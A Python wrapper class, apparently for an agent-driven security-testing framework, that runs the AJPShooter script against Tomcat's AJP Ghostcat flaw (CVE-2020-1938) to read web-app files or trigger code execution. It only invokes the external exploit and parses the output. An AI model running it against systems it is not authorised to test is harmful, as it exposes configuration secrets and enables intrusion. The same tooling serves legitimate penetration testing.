# tools/ajpshooter_tool.py
# AJPShooter - AJP Ghostcat 漏洞利用工具
import os
import json
import subprocess
from typing import Dict, Any
from tool_framework import CommandLineTool


class AJPShooterTool(CommandLineTool):
    """
    AJPShooter 封装 - AJP Ghostcat 漏洞利用工具
    用于利用 Tomcat AJP 协议文件包含漏洞 (CVE-2020-1938)
    """

    def __init__(self):
        cmd = "python3" if os.path.exists("/.dockerenv") else "python"
        super().__init__(cmd)

        docker_path = "/app/thirdparty/ajpshooter/ajpShooter.py"
        local_path = os.path.join(os.getcwd(), "thirdparty", "ajpshooter", "ajpShooter.py")
        self.script_path = docker_path if os.path.exists(docker_path) else local_path
        self.timeout = 30

    def name(self) -> str:
        return "ajp-shooter"

    def description(self) -> str:
        return "AJP Ghostcat 漏洞利用工具 (CVE-2020-1938)，Tomcat AJP 文件包含/读取"

    def supported_vulns(self) -> list:
        return ["AJP Ghostcat", "CVE-2020-1938", "Tomcat LFI", "AJP Injection"]

    def capability_statement(self) -> str:
        return "Tomcat AJP漏洞利用工具。针对CVE-2020-1938，可读取Web目录文件。适合：Tomcat服务器且开放AJP端口(8009)。"

    def check_available(self) -> bool:
        return os.path.exists(self.script_path)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {
                "type": "str",
                "description": "目标地址，如 '127.0.0.1:8009'",
                "required": True
            },
            "file": {
                "type": "str",
                "description": "要读取的文件，如 '/WEB-INF/web.xml'",
                "required": False,
                "default": "/WEB-INF/web.xml"
            },
            "mode": {
                "type": "str",
                "description": "模式: read (读取文件), eval (执行代码)",
                "required": False,
                "default": "read"
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        target_addr = params.get("target", target)
        file_path = params.get("file", "/WEB-INF/web.xml")
        mode = params.get("mode", "read")

        if not target_addr:
            raise ValueError("必须提供 target 参数")

        # 解析目标地址
        if ":" not in target_addr:
            target_addr = f"{target_addr}:8009"

        try:
            cmd = [
                self.cmd_path, self.script_path,
                target_addr,
                "-f", file_path
            ]

            if mode == "eval":
                cmd.append("-e")

            raw_result = self._run_command(cmd, timeout=self.timeout)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            # 分析结果
            file_read = len(stdout) > 0 and ("xml" in stdout.lower() or "web-app" in stdout.lower() or "<?xml" in stdout)

            result = {
                "success": True,
                "vulnerable": file_read,
                "target": target_addr,
                "file": file_path,
                "mode": mode,
                "content": stdout[:5000] if stdout else "",
                "summary": f"{'成功读取文件' if file_read else '未能读取文件'}: {file_path}"
            }

            result["stdout"] = stdout
            result["stderr"] = stderr
            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }